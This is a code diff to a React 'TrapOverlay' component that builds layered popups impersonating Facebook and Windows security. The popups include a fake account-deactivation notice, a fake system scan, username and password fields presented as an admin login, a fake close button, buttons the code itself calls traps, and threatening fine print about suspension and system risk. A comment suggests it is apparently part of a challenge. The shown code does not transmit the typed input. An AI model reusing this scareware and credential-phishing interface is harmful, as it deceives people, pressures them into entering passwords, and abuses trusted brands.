@@ -186,121 +186,213 @@ const TrapOverlay = () => {
 
   const currentPopup = popups[currentPopupIndex];
 
+  // Render Facebook logo
+  const renderFacebookLogo = () => (
+    <svg width="80" height="80" viewBox="0 0 36 36" fill="white">
+      <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z"></path>
+      <path fill="#1877f2" d="M13.651 35.871v-11.87H9.936V18h3.715v-2.36c0-6.493 2.36-10.64 9.304-10.64l3.71.005v5.995h-2.531c-2.467 0-3.199 1.745-3.199 3.264V18h5.905l-1.296 6h-4.61v11.87h-6.283Z"></path>
+    </svg>
+  );
+
+  // Render Windows logo
+  const renderWindowsLogo = () => (
+    <div className="grid grid-cols-2 gap-2 w-20 h-20">
+      <div className="bg-white rounded" style={{ opacity: 0.9 }}></div>
+      <div className="bg-white rounded" style={{ opacity: 0.9 }}></div>
+      <div className="bg-white rounded" style={{ opacity: 0.9 }}></div>
+      <div className="bg-white rounded" style={{ opacity: 0.9 }}></div>
+    </div>
+  );
+
   return (
-    <div 
-      id="fb-trap-overlay"
-      className="fixed inset-0 z-[999999999] flex items-center justify-center"
-      style={{
-        background: 'linear-gradient(135deg, rgba(10,10,10,0.98) 0%, rgba(20,20,20,0.99) 100%)',
-        backdropFilter: 'blur(10px)',
-        WebkitBackdropFilter: 'blur(10px)',
-        pointerEvents: 'all',
-        userSelect: 'none',
-        WebkitUserSelect: 'none',
-        MozUserSelect: 'none',
-        msUserSelect: 'none'
-      }}
-    >
-      {/* Hidden attempt counter for debugging (part of the challenge) */}
-      <div style={{ display: 'none' }} data-attempts={attempts}></div>
-      
-      {/* Fake Close Button */}
-      <button
-        onClick={handleClose}
-        className="absolute top-4 right-4 text-white/40 hover:text-white/60 transition-colors z-[1000000000]"
-        style={{ cursor: 'pointer' }}
-      >
-        <X size={32} />
-      </button>
+    <>
+      {/* Render all popups with decreasing z-index to create layered effect */}
+      {popups.map((popup, index) => {
+        // Only show current and previous popups for layered effect
+        if (index > currentPopupIndex) return null;
+        
+        const isActive = index === currentPopupIndex;
+        const zIndex = 999999999 - (currentPopupIndex - index);
+        const scale = 1 - (currentPopupIndex - index) * 0.05;
+        const opacity = isActive ? 1 : 0.3;
 
-      {/* Main Modal */}
-      <div 
-        className="relative max-w-2xl w-full mx-4"
-        style={{
-          background: 'linear-gradient(135deg, #1877f2 0%, #0e5fc5 100%)',
-          borderRadius: '24px',
-          padding: '48px',
-          boxShadow: '0 30px 90px rgba(0,0,0,0.8), 0 0 0 1px rgba(255,255,255,0.1)',
-          animation: 'modalPulse 3s ease-in-out infinite'
-        }}
-      >
-        {/* Facebook Logo */}
-        <div className="flex justify-center mb-8">
-          <svg width="80" height="80" viewBox="0 0 36 36" fill="white">
-            <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z"></path>
-            <path fill="#1877f2" d="M13.651 35.871v-11.87H9.936V18h3.715v-2.36c0-6.493 2.36-10.64 9.304-10.64l3.71.005v5.995h-2.531c-2.467 0-3.199 1.745-3.199 3.264V18h5.905l-1.296 6h-4.61v11.87h-6.283Z"></path>
-          </svg>
-        </div>
+        return (
+          <div 
+            key={popup.id}
+            id={`fb-trap-overlay-${index}`}
+            className="fixed inset-0 flex items-center justify-center"
+            style={{
+              zIndex: zIndex,
+              background: isActive 
+                ? 'linear-gradient(135deg, rgba(10,10,10,0.98) 0%, rgba(20,20,20,0.99) 100%)'
+                : 'transparent',
+              backdropFilter: isActive ? 'blur(10px)' : 'none',
+              WebkitBackdropFilter: isActive ? 'blur(10px)' : 'none',
+              pointerEvents: isActive ? 'all' : 'none',
+              userSelect: 'none',
+              WebkitUserSelect: 'none',
+              MozUserSelect: 'none',
+              msUserSelect: 'none',
+              transition: 'all 0.3s ease-out'
+            }}
+          >
+            {/* Hidden attempt counter for debugging (part of the challenge) */}
+            {isActive && <div style={{ display: 'none' }} data-attempts={attempts}></div>}
+            
+            {/* Fake Close Button - only on active popup */}
+            {isActive && (
+              <button
+                onClick={handleClose}
+                className="absolute top-4 right-4 text-white/40 hover:text-white/60 transition-colors"
+                style={{ cursor: 'pointer', zIndex: zIndex + 1 }}
+              >
+                <X size={32} />
+              </button>
+            )}
 
-        {/* Title */}
-        <h1 
-          className="text-white text-center mb-6"
-          style={{
-            fontSize: '42px',
-            fontWeight: '800',
-            textShadow: '0 4px 12px rgba(0,0,0,0.5)',
-            letterSpacing: '-0.02em'
-          }}
-        >
-          Account Temporarily Deactivated
-        </h1>
-
-        {/* Message */}
-        <div className="text-white/90 text-center space-y-4 mb-8">
-          <p style={{ fontSize: '18px', lineHeight: '1.6' }}>
-            Meta has temporarily deactivated your account due to suspicious activity detected on your profile.
-          </p>
-          <p style={{ fontSize: '16px', lineHeight: '1.6', opacity: 0.8 }}>
-            For security reasons, we need to verify your identity before you can continue using Facebook.
-          </p>
-          <p style={{ fontSize: '14px', lineHeight: '1.6', opacity: 0.6 }}>
-            This is a standard security measure and your account will be restored once verification is complete.
-          </p>
-        </div>
-
-        {/* Fake Progress Bar */}
-        <div className="mb-8">
-          <div className="w-full h-2 bg-white/20 rounded-full overflow-hidden">
+            {/* Main Modal */}
             <div 
-              className="h-full bg-white/80"
+              className="relative max-w-2xl w-full mx-4"
               style={{
-                width: '67%',
-                animation: 'progressPulse 2s ease-in-out infinite'
+                background: popup.logo === 'facebook' 
+                  ? 'linear-gradient(135deg, #1877f2 0%, #0e5fc5 100%)'
+                  : 'linear-gradient(135deg, #0078d4 0%, #004e8c 100%)',
+                borderRadius: '24px',
+                padding: popup.showInputs ? '40px' : '48px',
+                boxShadow: isActive 
+                  ? '0 30px 90px rgba(0,0,0,0.8), 0 0 0 1px rgba(255,255,255,0.1)'
+                  : '0 20px 60px rgba(0,0,0,0.4)',
+                animation: isActive ? 'modalPulse 3s ease-in-out infinite' : 'none',
+                transform: `scale(${scale})`,
+                opacity: opacity,
+                transition: 'all 0.3s ease-out',
+                pointerEvents: isActive ? 'all' : 'none'
               }}
-            ></div>
+            >
+              {/* Logo */}
+              <div className="flex justify-center mb-8">
+                {popup.logo === 'facebook' ? renderFacebookLogo() : renderWindowsLogo()}
+              </div>
+
+              {/* Title */}
+              <h1 
+                className="text-white text-center mb-6"
+                style={{
+                  fontSize: popup.showInputs ? '32px' : '42px',
+                  fontWeight: '800',
+                  textShadow: '0 4px 12px rgba(0,0,0,0.5)',
+                  letterSpacing: '-0.02em'
+                }}
+              >
+                {popup.title}
+              </h1>
+
+              {/* Message */}
+              <div className="text-white/90 text-center space-y-4 mb-8">
+                <p style={{ fontSize: '18px', lineHeight: '1.6' }}>
+                  {popup.message}
+                </p>
+                {popup.submessage && (
+                  <p style={{ fontSize: '16px', lineHeight: '1.6', opacity: 0.8 }}>
+                    {popup.submessage}
+                  </p>
+                )}
+                {popup.note && (
+                  <p style={{ 
+                    fontSize: popup.id === 'windows-security' ? '16px' : '14px', 
+                    lineHeight: '1.6', 
+                    opacity: popup.id === 'windows-security' ? 1 : 0.6,
+                    color: popup.id === 'windows-security' ? '#ff4444' : 'inherit',
+                    fontWeight: popup.id === 'windows-security' ? 'bold' : 'normal'
+                  }}>
+                    {popup.note}
+                  </p>
+                )}
+              </div>
+
+              {/* Input fields for admin login */}
+              {popup.showInputs && (
+                <div className="space-y-4 mb-8">
+                  <input
+                    type="text"
+                    placeholder="Username"
+                    className="w-full px-4 py-3 rounded-lg"
+                    style={{
+                      background: 'white',
+                      border: 'none',
+                      fontSize: '16px'
+                    }}
+                    onClick={(e) => e.stopPropagation()}
+                  />
+                  <input
+                    type="password"
+                    placeholder="Password"
+                    className="w-full px-4 py-3 rounded-lg"
+                    style={{
+                      background: 'white',
+                      border: 'none',
+                      fontSize: '16px'
+                    }}
+                    onClick={(e) => e.stopPropagation()}
+                  />
+                </div>
+              )}
+
+              {/* Fake Progress Bar */}
+              {popup.showProgress && (
+                <div className="mb-8">
+                  <div className="w-full h-2 bg-white/20 rounded-full overflow-hidden">
+                    <div 
+                      className="h-full bg-white/80"
+                      style={{
+                        width: '67%',
+                        animation: 'progressPulse 2s ease-in-out infinite'
+                      }}
+                    ></div>
+                  </div>
+                  <p className="text-white/60 text-center text-sm mt-2">
+                    {popup.id === 'deactivated' ? 'Verifying account security...' : 'Scanning system...'}
+                  </p>
+                </div>
+              )}
+
+              {/* Action Buttons (Both are traps) - only clickable on active popup */}
+              {isActive && (
+                <div className="flex gap-4 justify-center">
+                  <button
+                    onClick={handleAccept}
+                    className="px-8 py-4 bg-white font-bold rounded-xl text-lg hover:bg-white/90 transition-all transform hover:scale-105"
+                    style={{
+                      color: popup.logo === 'facebook' ? '#1877f2' : '#0078d4',
+                      boxShadow: '0 8px 24px rgba(255,255,255,0.2)',
+                      cursor: 'pointer'
+                    }}
+                  >
+                    {popup.showInputs ? 'Login' : 'Accept'}
+                  </button>
+                  <button
+                    onClick={handleIgnore}
+                    className="px-8 py-4 bg-white/10 text-white font-bold rounded-xl text-lg hover:bg-white/20 transition-all transform hover:scale-105"
+                    style={{
+                      boxShadow: '0 8px 24px rgba(0,0,0,0.2)',
+                      cursor: 'pointer'
+                    }}
+                  >
+                    Ignore
+                  </button>
+                </div>
+              )}
+
+              {/* Fine Print */}
+              <p className="text-white/40 text-center text-xs mt-8">
+                {popup.id === 'deactivated' 
+                  ? 'Attempting to close this window may result in permanent account suspension.'
+                  : 'Do not close this window. Your system security is at risk.'}
+              </p>
+            </div>
           </div>
-          <p className="text-white/60 text-center text-sm mt-2">Verifying account security...</p>
-        </div>
-
-        {/* Action Buttons (Both are traps) */}
-        <div className="flex gap-4 justify-center">
-          <button
-            onClick={handleAccept}
-            className="px-8 py-4 bg-white text-[#1877f2] font-bold rounded-xl text-lg hover:bg-white/90 transition-all transform hover:scale-105"
-            style={{
-              boxShadow: '0 8px 24px rgba(255,255,255,0.2)',
-              cursor: 'pointer'
-            }}
-          >
-            Accept
-          </button>
-          <button
-            onClick={handleIgnore}
-            className="px-8 py-4 bg-white/10 text-white font-bold rounded-xl text-lg hover:bg-white/20 transition-all transform hover:scale-105"
-            style={{
-              boxShadow: '0 8px 24px rgba(0,0,0,0.2)',
-              cursor: 'pointer'
-            }}
-          >
-            Ignore
-          </button>
-        </div>
-
-        {/* Fine Print */}
-        <p className="text-white/40 text-center text-xs mt-8">
-          Attempting to close this window may result in permanent account suspension.
-        </p>
-      </div>
+        );
+      })}
 
       {/* CSS Animations */}
       <style>{`
@@ -314,7 +406,7 @@ const TrapOverlay = () => {
           50% { opacity: 1; }
         }
       `}</style>
-    </div>
+    </>
   );
 };
 
